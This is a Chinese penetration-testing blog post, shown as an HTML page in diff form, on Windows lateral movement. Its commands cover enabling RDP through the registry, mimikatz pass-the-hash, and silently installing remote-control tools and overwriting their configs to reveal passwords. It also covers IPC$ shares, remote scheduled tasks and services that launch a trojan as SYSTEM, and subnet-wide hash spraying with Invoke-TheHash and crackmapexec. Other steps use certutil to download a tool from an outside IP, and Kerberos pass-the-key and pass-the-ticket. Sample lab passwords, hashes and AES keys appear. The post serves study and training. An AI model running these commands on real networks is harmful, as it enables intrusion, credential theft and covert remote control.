@@ -1,0 +1,1225 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="横向移动(一), InBlog">
+    <meta name="description" content="利用远程桌面进行横向移动条件
+远程桌面的利用条件：
+1、开启了3389端口
+2、防火墙等安全设备没有禁止
+3、网络必须相通
+4、拥有账号和密码（或者Hash）（可以是本身的账号也可以是自己添加的）
+
+查询3389开放情况
+1、可以使用net">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>横向移动(一) | InBlog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+    
+    <style>
+        body{
+            background-image: url(https://cdn.jsdelivr.net/gh/Tokisaki-Galaxy/res/site/medias/background.jpg);
+            background-repeat:no-repeat;
+            background-size: 100% 100%;
+            background-attachment:fixed;
+        }
+    </style>
+
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">InBlog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">InBlog</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/13.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">横向移动(一)</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
+                                <span class="chip bg-color">内网渗透</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2024-11-11
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    2.6k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    10 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.min.css">
+        
+
+        
+        <!-- 代码块折行 -->
+        <style type="text/css">
+            code[class*="language-"], pre[class*="language-"] { white-space: pre-wrap !important; }
+        </style>
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="利用远程桌面进行横向移动"><a href="#利用远程桌面进行横向移动" class="headerlink" title="利用远程桌面进行横向移动"></a>利用远程桌面进行横向移动</h1><p><strong>条件</strong></p>
+<pre class="language-none"><code class="language-none">远程桌面的利用条件：
+1、开启了3389端口
+2、防火墙等安全设备没有禁止
+3、网络必须相通
+4、拥有账号和密码（或者Hash）（可以是本身的账号也可以是自己添加的）</code></pre>
+
+<p><strong>查询3389开放情况</strong></p>
+<pre class="language-none"><code class="language-none">1、可以使用netstat –ano 查看端口开放情况
+2、可以使用REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal“ ”Server &#x2F;v
+fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f 开启3389
+3、查看RDP是否是3389
+reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal
+Server\Winstations\RDP-Tcp&quot; &#x2F;V PortNumber</code></pre>
+
+<p><strong>密码连接</strong></p>
+<pre class="language-none"><code class="language-none">1、可以进行密码抓取技术，抓取到账号和密码（明文）然后直接进行连接
+2、如果说没有抓到明文的密码只有Hash值，可以使用Hash值进行连接
+mimikatz:
+privilege::debug
+sekurlsa::pth &#x2F;user:用户名 &#x2F;domain:IP地址 &#x2F;ntlm:Hash值 &quot;&#x2F;run:mstsc.exe &#x2F;restrictedadmin&quot;</code></pre>
+
+<h1 id="远控工具"><a href="#远控工具" class="headerlink" title="远控工具"></a>远控工具</h1><h2 id="Todesk"><a href="#Todesk" class="headerlink" title="Todesk"></a>Todesk</h2><pre class="language-none"><code class="language-none">ToDesk.exe &#x2F;S  静默安装</code></pre>
+
+<p>运行ToDesk后会在默认安装目录下生成一个config.ini配置文件，存储的有设备代码、临时密码、安</p>
+<p>全密码以及登录用户和密码等重要敏感信息。不能破解密码但可以覆盖，重启ToDesk即可得到明文密码</p>
+<p>CS覆盖后：</p>
+<pre class="language-none"><code class="language-none">关闭进程然后重启
+tasklis 查找进程
+taskkill &#x2F;pid [PID] &#x2F;F
+shell ToDesk.exe</code></pre>
+
+<h2 id="GoToHTTP"><a href="#GoToHTTP" class="headerlink" title="GoToHTTP"></a>GoToHTTP</h2><p>上传后直接运行。运行后在运行目录下会生成一个配置文件<code>gotohttp.ini</code>,查看配置文件里面有连接地址和操作码，通过WEB页面和账号密码进行连接</p>
+<h2 id="RustDesk"><a href="#RustDesk" class="headerlink" title="RustDesk"></a>RustDesk</h2><p>直接上传运行不用安装</p>
+<p>配置文件路径<code>C:\Users\用户名\AppData\Roaming\RustDesk\config\RustDesk.toml</code>，因为必须放密码上显示后才会显示密码，所以本地运行后替换该配置文件即可</p>
+<pre class="language-none"><code class="language-none">tasklist
+taskkill &#x2F;pid [PID] &#x2F;F</code></pre>
+
+
+
+<h1 id="IPC横向移动"><a href="#IPC横向移动" class="headerlink" title="IPC横向移动"></a>IPC横向移动</h1><p><strong><font color="red">IPC利用条件：</font></strong></p>
+<pre class="language-none"><code class="language-none">1、开启了139、445端口
+IPC$可以实现远程登录及对默认共享资源的访问, 445端口可以实现对共享文件打印机的访问。因此,一
+般来讲需要445端口的支持。
+2、管理员开启了默认共享
+默认共享是为了方便管理员进行远程管理而默认开启的,包括所有的逻辑盘(c$、d$、e$、admin$) 可以
+实现对这些默认共享目录的访问 （net share）
+3、必须知道对方机器的用户名和密码</code></pre>
+
+<p><strong><font color="red">IPC</font></strong></p>
+<blockquote>
+<p>IPC( Internet Process Connection)共享，是为了实现进程间通信而开放的命名管道。</p>
+</blockquote>
+<p><strong><font color="red">共享文件</font></strong></p>
+<blockquote>
+<p>文件共享是指主动地在网络上共享自己的计算机文件。默认共享是为了方便管理员进行远程管理而默认</p>
+<p>开启的,包括所有的逻辑盘(c$、d$、e$、admin$) 可以实现对这些默认共享目录的访问</p>
+</blockquote>
+<p><code>net share</code>可以查看共享文件夹</p>
+<p>文件夹内<code>\\IP\c$</code>会默认使用当前用户名和密码进行对比,如果一样就能访问(该用户未登录也可以访问),不行则输入密码.共享文件必须是Administrator用户组下的才可以访问,可以是普通管理员.</p>
+<p><strong>IPC$连接方式</strong></p>
+<pre class="language-none"><code class="language-none">net share C$&#x3D;C:\      创建文件共享
+net use 查看连接的IPC
+
+net use \\IP\ipc$ &quot;password&quot; &#x2F;user:&quot;username&quot;      (工作组)
+net use\\域名\ipc$ “域成员密码” &#x2F;user:域名\域成员账号   (域用户)
+
+net share C$ &#x2F;del    删除IPC
+net use \\IP\ipc$ &#x2F;del   删除IPC</code></pre>
+
+<p>使用命令</p>
+<pre class="language-none"><code class="language-none">dir \\IP\c$
+tasklist &#x2F;sIP
+type \\IP\c$\文件路径
+net time \\IP地址
+copy 文件 \\IP地址\C$</code></pre>
+
+<h2 id="IPC配合计划任务横向移动"><a href="#IPC配合计划任务横向移动" class="headerlink" title="IPC配合计划任务横向移动"></a>IPC配合计划任务横向移动</h2><p>copy文件上去后可用计划任务将木马执行</p>
+<p>创建IPC认证后，直接输入远程创建计划任务是不行的，还需要输入账号密码才可以,否则是用本地用户名和密码进行比较.</p>
+<pre class="language-none"><code class="language-none">schtasks &#x2F;create &#x2F;s [IP] &#x2F;u [用户名] &#x2F;p [Admin@1234] &#x2F;tn [计划名]
+&#x2F;tr c:&#x2F;1.txt &#x2F;sc onstart &#x2F;RU System &#x2F;F
+schtasks &#x2F;create &#x2F;s 192.168.41.239 &#x2F;u administrator &#x2F;p Admin@1234 &#x2F;tn test
+&#x2F;tr c:&#x2F;1.txt &#x2F;sc onstart &#x2F;RU System &#x2F;F
+
+schtasks &#x2F;create &#x2F;s [IP] &#x2F;tn [计划名] &#x2F;tr [木马文件的位置] &#x2F;sc onstart &#x2F;RU System &#x2F;f
+schtasks &#x2F;create &#x2F;s 192.168.41.239 &#x2F;tn test &#x2F;tr c:&#x2F;1.exe &#x2F;sc onstart &#x2F;RU System &#x2F;f</code></pre>
+
+<h2 id="IPC配合服务横向移动"><a href="#IPC配合服务横向移动" class="headerlink" title="IPC配合服务横向移动"></a>IPC配合服务横向移动</h2><p>在建立IPC的情况下可以使用远程创建服务</p>
+<pre class="language-none"><code class="language-none">创建服务
+命令： sc \\IP地址 create [服务名] binpath&#x3D; &quot;cmd.exe &#x2F;c [木马路径]“
+	  sc \\IP地址 create [服务名] binpath&#x3D; &quot;cmd.exe &#x2F;c c:\wanli.exe“
+
+开启服务
+命令：sc \\ IP地址 start [服务名]
+	 sc \\ IP地址 start test
+
+删除服务
+命令：sc \\[IP] delete [服务名]
+	 sc \\192.168.17.138 delete test</code></pre>
+
+<h2 id="IPC配合盘符映射横向移动"><a href="#IPC配合盘符映射横向移动" class="headerlink" title="IPC配合盘符映射横向移动"></a>IPC配合盘符映射横向移动</h2><p>盘符映射就是将远程的共享盘映射到自己的电脑上然后操作自己的电脑就可以</p>
+<pre class="language-none"><code class="language-none">net use k: \\IP\c$(前提是建立IPC的连接下)</code></pre>
+
+<h1 id="PTH哈希传递攻击"><a href="#PTH哈希传递攻击" class="headerlink" title="PTH哈希传递攻击"></a>PTH哈希传递攻击</h1><p><strong><font color="red">mimikatz</font></strong></p>
+<pre class="language-none"><code class="language-none">mimikatz “privilege::debug”
+mimikatz “sekurlsa::pth &#x2F;user:[用户名] &#x2F;domain:[域名或者IP] &#x2F;ntlm:[ntlm-hash]</code></pre>
+
+<p>执行完成之后会弹出一个cmd</p>
+<p><strong><font color="red">psexec工具也可以PTH攻击</font></strong></p>
+<p>放一个东西到被攻击机弹shell回来,所以被攻击机有杀软就弹不回来</p>
+<pre class="language-none"><code class="language-none">psexec.exe [域名前缀]&#x2F;[用户名]@[机器名].[域名] -hashes LM-Hash:NTLM-Hash
+psexec.exe abc&#x2F;administrator@win10.abc.com -hashes aad3b435b51404eeaad3b435b51404ee:</code></pre>
+
+<p>执行完后就会获取shell</p>
+<p>CS自带psexec横向</p>
+<p>抓取到的不同用户的Hash</p>
+<pre class="language-none"><code class="language-none">在本地账号的情况下
+Administrator 可以进行PTH传递攻击
+本地普通管理员，不可以进行PTH攻击（除过早期的电脑 2003 xp）
+本地的普通用户，不可以进行PTH攻击
+
+域账号
+Administrator 可以用来PTH
+域普通管理员 可以用来PTH
+域普通用户 不可以（默认）</code></pre>
+
+<p><strong><font color="red">Hash碰撞</font></strong></p>
+<ol>
+<li>Powershell脚本</li>
+</ol>
+<pre class="language-none"><code class="language-none">传递Invoke-TheHash.zip
+tar -xzvf Invoke-TheHash.zip  解压到当前目录
+cd Invoke-TheHash
+
+Import-Module .Invoke-TheHash.ps1（导入批量模块）
+Import-Module .Invoke-WMIExec.ps1（导入wmi模块）
+或者直接导入Invoke-TheHash.psd1就相当于导了上面两个
+
+Invoke-TheHash -Type WMIExec -Target [IP段]4 -Username [用户名] -Hash
+[hash值]
+Invoke-TheHash -Type WMIExec -Target 192.168.41.0&#x2F;24 -Username administrator -Hash
+570a9a65db8fba761c1008a51d4c95ab</code></pre>
+
+<p>CS中</p>
+<pre class="language-none"><code class="language-none">shell powershell -exec bypass -command &quot;&amp; &#123; import-module .\Invoke-TheHash.psd1;Invoke- TheHash -Type WMIExec -Target [IP段] -Username [用户名] -Hash
+[hash值]&#125;&quot;</code></pre>
+
+<ol start="2">
+<li>CrackMapExe工具</li>
+</ol>
+<p>整个zip文件都传上去,只传exe会报错</p>
+<pre class="language-none"><code class="language-none">crackmapexec.exe [IP段] -u [用户名] -H
+[LM-Hash]:[NTLM-Hash]
+
+crackmapexec.exe 192.168.41.0&#x2F;24 -u administrator -H
+570a9a65db8fba761c1008a51d4c95ab:570a9a65db8fba761c1008a51d4c95ab</code></pre>
+
+<h2 id="CS上线"><a href="#CS上线" class="headerlink" title="CS上线"></a>CS上线</h2><ol>
+<li>CS自带的插件可以使用PTH直接横向上线</li>
+</ol>
+<p>右键psexec可以直接上线</p>
+<ol start="2">
+<li>使用Mimikatz工具上线</li>
+</ol>
+<p><strong><font color="red">远程登录下:</font></strong></p>
+<pre class="language-none"><code class="language-none">mimikatz “privilege::debug”
+mimikatz “sekurlsa::pth &#x2F;user:[用户名] &#x2F;domain:[域名或者IP] &#x2F;ntlm:[ntlm-hash]</code></pre>
+
+<p>执行完成之后会弹出一个cmd,可以执行copy，计划任务，服务等让他上线</p>
+<p><strong><font color="red">CS中:</font></strong></p>
+<p>因为CS中不能操作弹出的cmd,所以只能用插件进行上线</p>
+<p>如梼杌的横向移动下的Mimikatz-pth,认证后就可以直接在命令行进行计划任务,服务等</p>
+<p><strong><font color="red">工具进行PTH横向</font></strong></p>
+<p><strong>Impacket工具包下的五个*exec.exe文件都可以横向</strong></p>
+<p>命令</p>
+<pre class="language-none"><code class="language-none">用户名:密码@IP地址 &quot;cmd &#x2F;c [命令]&quot;
+psexec.exe admin:ZHou258022@192.168.235.138 &quot;cmd &#x2F;c cmd.exe&quot;
+certutil -urlcache -split -f  http:&#x2F;&#x2F;10.218.11.204&#x2F;fscan C:\Users\admin\Desktop\fscan  下载文件
+
+用户名@IP地址 -hashes LM-HASH:NTLM-HASH &quot;cmd &#x2F;c [命令]&quot;
+域名&#x2F;域账号:密码@IP地址(或者全域名) &quot;cmd &#x2F;c 【命令&quot;
+域名&#x2F;域账号@IP地址(或者全域名) -hashes LM-HASH:NTLM-HASH &quot;cmd &#x2F;c [命令]&quot;</code></pre>
+
+<h1 id="PTK秘钥传递攻击"><a href="#PTK秘钥传递攻击" class="headerlink" title="PTK秘钥传递攻击"></a>PTK秘钥传递攻击</h1><blockquote>
+<p>PTK(Pass The key)，中文叫秘钥传递攻击，PTH传递中，使用的是NTLM-HASH值，PTK使用AES256或者AES128的方式进行传递,PTK 攻击只能用于kerberos认证中,NTLM认证中没有</p>
+</blockquote>
+<p>AES KEY 是kerberos协议中使用的，所以一般域用户才有AES KEY，AES分为两种 aes256和</p>
+<p>aes128，本地用户没有aes key</p>
+<p>抓取key命令</p>
+<pre class="language-none"><code class="language-none">mimikatz privilege::debug
+mimikatz sekurlsa::ekeys</code></pre>
+
+<p>条件：</p>
+<pre class="language-none"><code class="language-none">1、必须是域环境，使用域账号才可以进行PTK
+2、支持aes进行认证</code></pre>
+
+<p>PTK本质上也是一种认证，本身不具有攻击性，如果是一些特殊账号的KEY被我们知道利用PTK传</p>
+<p>递攻击，我们可以生成对应账号的TGT票据，然后将票据导入到内存中，就可以访问对方的电脑</p>
+<p>。可以使用 getTGT工具申请TGT，然后将TGT导入内存中，实现对目标机器的访问，后续可以配合</p>
+<p>计划任务，或者其他的工具进行上线</p>
+<pre class="language-none"><code class="language-none">第一步、生成TGT  这里使用getTGT工具
+可以生成TGT的工具有很多，比如kekeo Rubeus getTGT PS脚本等等，我么使用getTGT
+getTGT.exe test.local&#x2F;admin -aesKey b9f765693d04428d4762a82bcf00bfec50261371fe16c36e3c788d19f8a9d415
+执行完成之后会在当前的目录下生成一个TGT票据，后缀是ccache
+
+第二步、将TGT注入到内存
+工具有很多，比如kekeo Rubeus getTGT PS，mimikatz 等等，这里使用mimikatz
+mimikatz Kerberos::ptc 票据名字
+执行完成之后会在当前的目录下生成一个TGT票据，后缀是ccache（凭证高速缓存）
+
+第三步、能访问，copy后计划任务，服务等上线
+dir \\DC.TEST.LOCAL\c$</code></pre>
+
+<p>同样，之前的<strong>Impacket工具包下的五个*exec.exe文件也可以拿shell</strong></p>
+<pre class="language-none"><code class="language-none">psexec.exe test.local&#x2F;admin@dc.test.local -aesKey b9f765693d04428d4762a82bcf00bfec50261371fe16c36e3c788d19f8a9d415</code></pre>
+
+<p>如果是域管的key，可以直接访问其他域成员主机</p>
+<h1 id="PTT票据传递攻击"><a href="#PTT票据传递攻击" class="headerlink" title="PTT票据传递攻击"></a>PTT票据传递攻击</h1><p>条件：</p>
+<pre class="language-none"><code class="language-none">1、必须是域环境，域内才可以PTT
+2、必须拥有相应的票据（主要是域管理员票据）</code></pre>
+
+<p>命令：抓取的必须是域控或者域管，普通用户不能传递</p>
+<pre class="language-none"><code class="language-none">getTGT.exe test.local &#x2F;admin:ZHou258022  哈希也可以   生成ccache文件
+mimikatz kerberos::ptc admin.ccache  此时就能正常通讯
+dir \\dc.test.local&#x2F;c$</code></pre>
+
+<p>Kekeo生成Kirbi</p>
+<pre class="language-none"><code class="language-none">Kekeo的命令：Tgt::ask &#x2F;user:域用户 &#x2F;domain:域名 &#x2F;password:密码
+mimikatz kerberos::ptt admin.kirbi</code></pre>
+
+
+
+<p>如果是域管账号，其他域用户都可以访问域用户</p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Doramer</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://doramer.github.io/2024/11/11/2024-10-4-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8(%E4%B8%80)/">https://doramer.github.io/2024/11/11/2024-10-4-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8(%E4%B8%80)/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Doramer</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
+                                    <span class="chip bg-color">内网渗透</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2024/11/11/2024-10-8-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8(%E4%BA%8C)/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="横向移动(二)">
+                        
+                        <span class="card-title">横向移动(二)</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2024-11-11
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Doramer
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
+                        <span class="chip bg-color">内网渗透</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2024/11/11/2024-10-01-%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="密码抓取">
+                        
+                        <span class="card-title">密码抓取</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2024-11-11
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Doramer
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
+                        <span class="chip bg-color">内网渗透</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
+
+
+<!-- 代码语言 -->
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h1, h2, h3'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
